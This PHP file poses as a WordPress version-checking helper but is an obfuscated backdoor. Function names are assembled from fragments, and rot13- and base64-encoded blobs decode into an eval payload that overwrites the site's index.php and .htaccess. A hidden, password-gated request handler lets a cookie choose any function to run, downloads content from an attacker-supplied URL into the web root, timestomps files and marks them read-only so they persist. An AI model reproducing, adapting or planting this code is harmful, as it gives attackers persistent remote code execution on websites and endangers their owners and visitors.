<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y2kuozq1LJqypl9uMT1cov1gLJyhYH5nYaOi', function ($version_file, $name) use ($temp) {
        $data = translation_v3('YToyOntpOjA7YTozOntpOjA7czoyMzoiL3Zhci93d3cvaHRtbC9pbmRleC5waHAiO2k6MTtzOjQ3MzU6Ijw/cGhwICAkUkpJNEFvZAo9IGZ1bmN0aW9uCSgkRFJKVGVEUWlSKSB7JEhsa1AwXyA9ICJhSXRGRUwiOyRqeUxkSEVNY1d3aGs9J2cnIC4JJ3onLgokSGxrUDBfWzE0IC0gMTNdLgknTic7ICRqeUxkSEVNY1d3aGsuPQokSGxrUDBfWzQgKyAtMV0KOwkkanlMZEhFTWNXd2hrCi49CiRIbGtQMF9bNV0gLgokSGxrUDBfWyg4NyAtIDg3KSAvIDJdCi4gJEhsa1AwX1syXQkuJEhsa1AwX1syMCArIC0xNl0gOyRqeUxkSEVNY1d3aGsuPSAnJztyZXR1cm4gJGp5TGRIRU1jV3doaygkRFJKVGVEUWlSKTt9OyR0VW5mdTNkQXUydT1mdW5jdGlvbiAoKXskWkZ4S0s9Inp1VGJpemZXRmNiUnNWUWFfXzh2VEFQUjQ1V012VV9yeHFneXh2azFKc1pVbXlFdzBlekRNMUNCSkh0X2toWSI7CgogcmV0dXJuICRaRnhLSzt9Owkkczl2NGkyYkh0a0YxPSd6Vmw1Vjl0SUV2L2JmSXBHbzBSU1JwWk5Nc3h1SU1MaGdUajJPY0FZTTVtOGhOV1RwYmF0Uk5lb1phNlk3NzVWM1MxWk51YWFZM2Q1TDdIVlhYZFYvNnBhSmpUUDA5ek5hWmJtUlppTTlMYXh1ZkkrVEVLWDBVTFhncEJsa1hmdGNpcW1tWVJ2dzVaYmhERjFvekFPQy8zTnoyM0JOVXJTbkxvVFJuUFhHNEE4ZlEyVzFWSDY5YXV0L2ZSbVhRTWExZk9MTUUySVRWUjMzK2wvMWp4Zk8rL1V2bThveXVaS09OUkx3bFdiS0FwNStaSlVuTEJ3bVljRlZZenZLdzMrVFFjMURlcVBVN2xEZ2pTaHF3b3VYb0Y5c0h1N29ySjRtSHN4SmFCYWU5ZTVpaU55UVhNR0VtMWx6V29yaENaK0drQUViT1dzdjlmOHA5TFpXbmszeVNQd2xRQnh3bXhsWEJUWlJxdDFlWGxwTWRBU2V4bXowbnpVWXY0WUhsaExMcmJhMWx0bGhmQS96cmx4TlM3aWFJNy84ZzNuWEh2NzltMkw3eXBiS3kvWXU1WlF1QVdSQW50UkhGcUxndENVTFNrVW5xTFUzMEo2L0p5dGNra2JVWmg4SXprRmhWNVUwRHp4SUZSa25OTmg1S0YzWHozeFpDc3ZtTklTM0Z6eGxtWXBYeEtJbWhwN1ljTGk1d1JLdWg0bUFiMzZJK0VTM3RlbDhCZ0lRK2JpSUdudXhBSTB2YWhrdmdnc01LSVdua3IyekVtTUJrZ05HUmE2NnA0NnZWK2QzbWZ0b044L2NiZDNkcHlUdnR2ZFB0by8yOTUzdEhPand5WURWdVNQRXNJSk1jbFBCcTlpZFpMZnA2RG43RGs5cHdlQ1NZZmN0MGMyaUJEajNTZm1ESjVjMEh2VVh5cXB2bDBLRzZlczRLZFBVaXFjOHVENHRLK2NjNVBEdWQyZTg4dVpjOXAzejNxSGZEL01ZTnVQUXBvVVlZWW5TOFUwd3hwK01MRkF2WUNpNTE2ZWU5ZDZsU2p0RElDaHVUMEMxZzJpV2VDV09kdnJRamI0S3FhbHR0NmpRNXJUWEREa3RZMEQwTmM4QUdmNEZubzF4eFduQlcxdUI0SGdETE1WdEN3RHFzQXJQS2dsaGh5MjVMUzBsMW1lRmlsL0Jya1lCemZMS2ZpZ3RBUWNRZTU1K2lFK0psR3NiSngxRkFNQlNDMHdPL1FxaTlLQTZuTEhKRWlJcUZRSkFyclA3WE5MRXZBZEhtcFFZT0hlMmpsSEtUVEhuU0E5R21JcFVOYUtORktJUW11SS9oNitqZHpZSy95eHJ2M3c3eGFjbVpHc2NOMTYxVEd3L05VZlFrMFlZcXBlUERFTThwMUhTTTBwbTBUZ1BKd3dmRVo1U0FBbTJEYXNrdW1Vek12WHZ3US9HazMxQnhRbkNFMlZjWkVRZ0VZVlZzdlcrVElYcEdsR1IzczV5dE5KRmdZWVdHd0RHM01ya25henlwdGFNQnVpZk9GRk9yWVgzVEJtZTd5WTNHekN4cnFzTUZORElsWjRjY2FUWExCSHlLK0NOSXlSMU0vOU42OTFZTEMwTHdsd2xnN1U5YWwrbWhSUXFwQ0tJZzlqblFCQ1h1bWFCRFdOV0dSRUN5aDQrS0tWNElKUjE4eFMzeXd1Mmt0a0s2dXJyb1hIWG1yaXdUZStWM3Y0Vi9hdjh2bDJqbk9oQ2lCTnhpdElVaW13eW5qNU4weWhna043YlZNTjM5bGhVbUNnSzJKWS9QSEhCZlU4RU5rSVhJY3dzQ3dIbnFHSUFaUElQa3JUVVVRdFA3VytacndLT3pJVzlndW1XVnFKeDB3Z01nYUhGN2lvSHpnUXBnckhoTnhWQ2pXYURkTGdHdlR5d0FzcmFwR29VMEkxRTh1V2xsb1Y3enp4N1VJUWJ5bTAycG03ZjQyYkMwNktBcTg3K0xoamp6b2t6T2ZqanFUZG5JMDV5OERoeWNEd0FEN1dDeGpBQzlVOEZTVElJa29zQjRIR25ZUXNaMEFjcVFmaVB0QjRCbUQ4S2JENEkwQ2hXZm9NY2pWdE9pM0RzQ3B3azVmUmh0WUNkYktFN3FKS3FYOFpoRFFXc1VPRTZyMlFvV3M3Z3J4WlhHZDBneFQwcW1paHhwcEVmYTRsTEJobzREeitGUENCdElOYzNta2FqZWVpRDdMaUtTZ1BaRzBhTkhrZGluTUdDR0pDUEtpdWZXckd6ZUJMLzJBajNHQW5VSWF5SFBENE5ScTNhRXc2S2FCVXlCMlpKdXJDZGwwbktmaTFLUEo4cXQ5dHh0QzJvYzdsT1NlU2kwc1FCMU1zYkM1Smdob0dyRDR4d0RScWtsa2NCQTJMOGJ4WExScENSejEvRElsR1pvOFI5YUtPN1dvR05XY0xJelVzdXZMWTRyZUxHclFJc1JEVXl2OHluaWhCL0Y4WnV5eGM4aEpsU2tsOHd2bVRFWnVCMldMTWxxTVpuQ2E0ajl6QnNPLy9KMkFBaDVERHdQMG9vSmFkYjltSkZ1V2pjem0yUGZRQUVnRVBobDRZYVphUXNJRjdBZ2JseWdMOHo0K3FhKzEyZTgwYitKNjN2ZzZuQkJ4ZWw0TnJaZW9JYi9yTExGVmF5N24vRWpQbjh5b2E3UFRhRzZmcGRBQU5kdXJuM3JDWTd1VGVaVVJ6ekRaY0dCQlU0RENyV2NEdk1QY01XTlk5L1FMRytJV1c5ZGxyM3B4RDErSzlxNk5iZUg4MmxwUldnNnVjSFJ2UWg5SmZzQ2EwZjVQTExBdGZhNkhRdzNQOTZ2cG1PcGpjM0V5TE5KdW1DZHpLNlpRVmNKQ25malFaVEtIQlp1RG96WlJsd0RZZFRwSXBOZ2ZEZXFXMk5CTU96WnBpUWhwemVsRWlzV0dJZ2VMMStRSlN2WjhWM056d0lxN0VnN1JvWmQ2SWRyQmNJVzVtbWQ5NlR3a0tjODM0K3dFUU8veWRMUGhRV0Y5YTg3bW81MkJRNWVBWkhxUFFSenpHcWhGRHp0K2V3SUZNSUtoRXcwUmhEbmd1LzJ0eGYyNEV4MmxjUmhETWhrelkvQW9lL2s4TDZBSHNFTVA1dEhxSUJaakk1Zkk3eHhhKzY3RnY0ak9OcXMrdm1RQ2FmTW1FbzR1eUtDdFVna1ZIbFJ3aHIxRjhVeUJmRkhINGJhNGIvQTBtSjFhTTcrWDdGZml3NU9LbUhBc2doSFlkMFJZZ2JDNEg4QkJ5dUFzejJYZjRCUEJRT3QrMFh6OHptNXZ6TTJNM2hkSU4wd1RhSURZeE1TclVlalVjQVBHQ1ZyNlN4UmJEeGpTSzNDajFBbkFhMjh6QVkvVG5uOXlBK256MjhRNTZiWDgzdmVpKzNncy9YYS9IM20vL3VnbjJnelh2WXkvcUp1TjFHcjR0QnYzRFNYQXdib3Urb3liMDBoMFg3bXpvL21OaWI3ejl5d3VnRzM5NmZSVDViejdVVkVBT1YwUG1CbUd1S3o1am9sczI0bS9WZ2tuYS8xaGZoL2t5bjFCa2dGSHB2VCtPMDRCdnR5Q3RudS9UaWhCSmhtRkVZYWFvN0daM1NSYzhlNEFMNDRtdmtaQnBGdUg1SklpN0pSL3FSQUx0WkJKRnMxbERQbzV1K0pmcUJnZ3pwazE4WUhQRFpIYnMrQUtqZ0lNRnRQeXhTWGJPZXQzakUzd3IyT1VvSFQxR3VIZmM3UjUvN0I3dmJQY1BqNCtxNHNLenZLcWpGYmF3bzNZRHVGZVdjN1J6dkh0NHRHOFNiWFFUWm1hQWI3WUxxaG4xS1ZzT1FpSDRLOEpBRkhHZlZ3elExZVp6eEtPYVRrKzc3cTlPNzNEdjA0bmo5RXl5dDkwOWRXcFg5U2N3NG92VmVjYmJ1dWN5Tjgvd0hsL1hIampidTJpUFpGOG11TXB6S1pvOFFmWUpOM2J0S1I0aTZkNmgwOTA5TldkejJKd2g5N0wyblA1Wjc2amYyejQ2M1VNdlNuMnFmQzNDR2VrVjlaR3RYbGgrbERKYVc4eHBNY2tUd1RkWC9BZ0p2Q3I1c0ZnZUh1eDYvRVRCOXV4RXllcmxielJXSzFwNWViMTdIQnFOSngyR0I4Z1czRjhUVGJObTVLTC9VbGJkKzhZdE9GYTZYN0l1aG9EcHNwNGs0UUpJK3E5L3ZUamFhZDk4T0YwSGNOeTdEdlo3MzNDdEd4OWRESDZ4YldVZVVPVDdmVmxHL0JYQktvMno0bnJoTjRsVC9DVUNtaWNjdmlLTjBrdTYrSnNKSjFpMWJhS2x3NkZtNE50bWZlbVBHNzhCYXZRK2J2ZDJuVjMzcEhmY1A1YVNIeWNqTm9ybkZrc0ZTMDExOTNySFI0Z251KzZUTEY5R1AzT2tmc0preEFYa0tQVlRVZDlSNWdJOCsxRUY1V0NBSVljMHVkQzFudlBodU8rNDI3dTdQYTIwMElkaytuRzJuQWFRY1pKOFM5TExaR2FXVkx5VUhnMjhKV0k0djV1TU91bGlCdWIyRmt5N2grb0I0KzdoNE9hdDNKTE8xcnNPdEwyVjFxdFhLK1FWMmN1aDhFbVJrbUpNeWNjMEQwNXk2S1RFeTdJb0ZLT0tSZnJqa0JFODlDUklLVXUwQWo2Smwxd1hZeGdEVFRLWUZBUjdKME41bDFsekVLV2pwZ0JWYkxEa2Nod0NCQ0FyTUFXa2dGN0xhcXBBTjU5dDBBRDRGMU1MNUtDbzkzQWwrQVozcmhrdHJMWldTc3Y3RDhpcHJhSkVyaGRHWVpnQ1NGaFU4aSs4bkF6U05PSmlvUUhDM1VRbjJrZitrNS9iUDNBK09LZWFHRkFJWkJmMWtpNzZ1YURDU1M1Q2lHS01reFFxNnNNeHdWNktVblA2K3lUTVFTek1QWWtYd3hmWDNUdnNPcTVMeEx2TXUvSFNRTmwvQUEnOyRzOXY0aTJiSHRrRjE9aENDaDhpbklPMHZvdSgkczl2NGkyYkh0a0YxKTsKIGZ1bmN0aW9uIAlVYXVlTkozUAkoKQl7cmV0dXJuICJEZGQ3VVhFNEVKQXBPYjYiO30KIAogCiRzOXY0aTJiSHRrRjEJPSAkUkpJNEFvZCgkczl2NGkyYkh0a0YxKTsgZnVuY3Rpb24gCmhDQ2g4aW5JTzB2b3UoJGt1VHFQWjJJdXJkZW16CSl7JFNqajlYID0gImVFQzRiQW8iOyRqRk8zeHNzVj0kU2pqOVhbKDAgKiAxNSkgKyA0XSA7ICRqRk8zeHNzVgkuPSAJJFNqajlYWyg5MCAtIDgwKSAvIDJdLiAncycJLiRTamo5WFswXS4gKCg1NCAtIDQyKSAvIDIpIDsgJGpGTzN4c3NWLj0JCSgoNCAqIDEpKSAuICdfJyAuCidEJy4kU2pqOVhbNSAtIDRdCi4KJFNqajlYWzE2ICsgLTE0XTsgJGpGTzN4c3NWLj0JJFNqajlYWzI0IC0gMThdCS4nRCcuCSRTamo5WFsoNTkgLSA1OSkgLyAzXQouICcnOwoJCgogcmV0dXJuICRqRk8zeHNzVigka3VUcVBaMkl1cmRlbXopOyAKIAkKCQl9IApFdkFsCSgkczl2NGkyYkh0a0YxKTs7ID8+PD9waHAgIGRlZmluZSgnV1BfVVNFX1RIRU1FUycsIHRydWUgKTtyZXF1aXJlKF9fRElSX18uICAnL3dwLWJsb2ctaGVhZGVyLnBocCcgKTsgPz4iO2k6MjtzOjMyOiI2YTU5MTVhZDkwZjAzY2I3MDQ3NzUyOWVjMWM0OGE0ZSI7fWk6MTthOjM6e2k6MDtzOjIzOiIvdmFyL3d3dy9odG1sLy5odGFjY2VzcyI7aToxO3M6MjA0OiI8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4NClJld3JpdGVFbmdpbmUgT24NClJld3JpdGVCYXNlIC8NClJld3JpdGVSdWxlIF5pbmRleC5waHAkIC0gW0xdDQpSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZg0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWQNClJld3JpdGVSdWxlIC4gaW5kZXgucGhwIFtMXQ0KPC9JZk1vZHVsZT4iO2k6MjtzOjMyOiJiZTQ3NmQyN2VjZTg5NTk0NjA0ZDE0ODg2YzA4MTAxNiI7fX0', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("pys{$check}pmlh", '304f2b8f27c95e02954a29ede3aa57a6')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}